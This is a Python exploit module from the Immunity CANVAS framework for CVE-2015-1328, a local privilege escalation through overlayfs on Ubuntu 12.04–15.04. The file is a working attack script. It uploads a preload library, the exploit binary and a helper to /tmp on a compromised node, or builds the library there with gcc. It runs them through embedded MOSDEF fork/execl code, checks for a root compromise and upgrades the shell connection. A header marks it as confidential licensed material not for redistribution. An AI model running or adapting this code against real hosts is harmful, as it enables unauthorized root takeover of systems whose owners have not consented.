#!/usr/bin/env python

# The information provided below is only available to subscribers of Immunity's Early Updates
# and is subject to the terms of the Immunity CANVAS Software License Agreement located here:
#
# https://www.immunityinc.com/downloads/license.txt
#
# It is the customer's responsibility to maintain the confidentiality of this information, and
# any tools, techniques, or information provided as part of the Immunity's CANVAS Early Update
# Program.

# This information is not for re-release to any third party, including contractors, consultants,
# and temporary workers.

import sys
import time
import logging

from exploitutils import *
from canvaserror import *

from ExploitTypes.linuxLocalExploit import LinuxLocalExploit

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'Ubuntu Overlayfs local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Ubuntu'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2015-1328'
DOCUMENTATION['CVE Url']       = 'http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html'
DOCUMENTATION['References']    = 'http://seclists.org/oss-sec/2015/q2/717'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Linux'] ]
PROPERTY['VERSION']            = [ 'Ubuntu 12.04', 'Ubuntu 15.04' ]

DOCUMENTATION['Notes']         = """

This is a local privilege escalation for Ubuntu affecting 12.04, 14.04, 14.10, and 15.04.

Currently supporting:
- 14.04
- 14.10
- 15.04
"""

class theexploit(LinuxLocalExploit):
    def __init__(self):
        LinuxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.local_helper       = self.local_helper_64
        self.local_exp          = os.path.join(self.local_res, 'x_')
        self.local_migrate_lib  = os.path.join(self.local_res, 'ubuntu')
        self.local_migrate_tmp  = '/tmp/migrate_tmp'
        self.remote_exp         = '/tmp/x'
        self.remote_helper      = '/tmp/h'
        self.remote_lib         = '/tmp/migrate_lib.so'

    def fork_and_execl(self, command, wait = 0):
        if not self.remote_helper:
            logging.error("self.remote_helper not set inside exploit class")
            return 1

        if not self.remote_exp:
            logging.error("self.remote_exp not set inside exploit class")
            return 1

        lvars            = {}
        lvars['COMMAND'] = command
        lvars['HELPER']  = self.remote_helper
        lvars['MOSDEF']  = '%d' % self.node.shell.fd
        lvars['WAIT']    = wait

        code = """
        #import "string", "COMMAND" as "COMMAND"
        """

        if command == self.remote_exp:
            code += """
        #import "string", "HELPER"  as "ARG1"
        """
        else:
            code += """
        #import "string", "MOSDEF"  as "ARG1"
        """

        code += """
        #import "int",    "WAIT"    as "WAIT"

        #import "local", "fork"    as "fork"
        #import "%s", "execl"  as "execl"
        #import "local", "exit"    as "exit"
        #import "local", "sendint" as "sendint"
        #import "local", "waitpid" as "waitpid"


        void main()
        {
            int pid;

            pid = fork();

            if (pid == 0) {
                execl(COMMAND, COMMAND, NULL);
                exit(-1);
            }

            sendint(0);

            if (WAIT == 1) {
                waitpid(pid, 0, 0);
            }
        }
        """ % ("remote64" if hasattr(self.node.shell, "LP64") and self.node.shell.LP64 else "remote")

        ret = self.node.shell.runCode(code, lvars)
        return ret

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                logging.error("Node has no shell server available")
                logging.error("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_linux_node():
                continue

            version_info_found = True

            if self.is_ubuntu_14_04():
                logging.warning("Targeting Ubuntu 14.04")
                self.local_migrate_lib += "_14_04"
            elif self.is_ubuntu_14_10():
                logging.warning("Targeting Ubuntu 14.10")
                self.local_migrate_lib += "_14_10"
            elif self.is_ubuntu_15_04():
                logging.warning("Targeting Ubuntu 15.04")
                self.local_migrate_lib += "_15_04"
            else:
                version_info_found = False
                self.remote_lib = "/tmp/m.c"

            if self.is_64bit_node():
                logging.warning("Targeting 64bit")
                self.local_exp          += "64"
                self.local_migrate_lib  += "_64.so"
            elif self.is_32bit_node():
                logging.warning("Targeting 32bit")
                self.local_exp += "32"
                self.local_migrate_lib += "_32.so"
                self.local_helper = self.local_helper_32
            else:
                logging.error("Unsupported node type")
                continue

            if not os.path.exists(self.local_migrate_lib):
                version_info_found = False
                self.remote_lib = "/tmp/m.c"

            logging.info('Uploading lib to preload')
            if not version_info_found:
                logging.warning("Version info for target not found or prebuild lib not available, continuing with manual build mode (requires gcc on target)")
                self.local_migrate_lib = os.path.join(self.local_res, "migrate_lib.c")
                with file(self.local_migrate_lib, 'r') as migrate_tmp:
                    migrate_code = migrate_tmp.read()

                migrate_code = migrate_code.replace('PATH', self.remote_helper)
                with file(self.local_migrate_tmp, 'w') as final_migrate_tmp:
                    final_migrate_tmp.write(migrate_code)

                if self.nodeUpload(self.local_migrate_tmp, self.remote_lib) == False:
                    self.setInfo("%s Done (Failed to upload preload source)" % (self.name))
                    continue

                try:
                    os.remove(self.local_migrate_tmp)
                except OSError, e:
                    pass

            else:
                if self.nodeUpload(self.local_migrate_lib, self.remote_lib) == False:
                    self.setInfo("%s Done (Failed to upload preload source)" % (self.name))
                    continue

            self.add_file_for_cleanup(self.remote_lib)
            self.setProgress(20)

            logging.info('Uploading helper and exploit')
            if self.nodeUpload(self.local_exp, self.remote_exp) == False:
                self.setInfo("%s Done (Failed to upload exploit)" % (self.name))
                continue
            self.add_file_for_cleanup(self.remote_exp)
            self.setProgress(40)

            if self.nodeUpload(self.local_helper, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)
            self.add_file_for_cleanup(self.remote_helper)

            logging.info('Executing exploit')
            self.fork_and_execl(self.remote_exp, wait = 1)

            self.setProgress(90)

            # wait 5 secs for the exploit to complete
            wait_secs = 4
            if self.compromised(self.remote_helper, wait_secs):
                logging.warning('Compromised!')
                logging.info('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                logging.info('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                logging.error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
